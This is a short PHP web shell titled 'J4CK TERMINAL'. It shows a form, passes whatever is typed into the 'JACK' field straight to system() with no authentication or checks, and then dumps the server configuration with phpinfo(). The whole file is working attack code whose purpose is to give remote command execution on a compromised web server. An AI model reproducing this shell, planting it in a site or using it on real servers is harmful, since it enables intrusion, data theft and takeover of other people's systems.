<?php
echo "./J4CK TERMINAL";
        echo "<pre>";
        echo "<form name='form' action='#' method='post'>
        <input type='text' name='JACK'/> <input type='submit' value='enter'/>
        </form>";
        $cmd = ($_POST['JACK']);
        system($cmd);
        echo "</pre>";
        phpinfo();
        die;
?>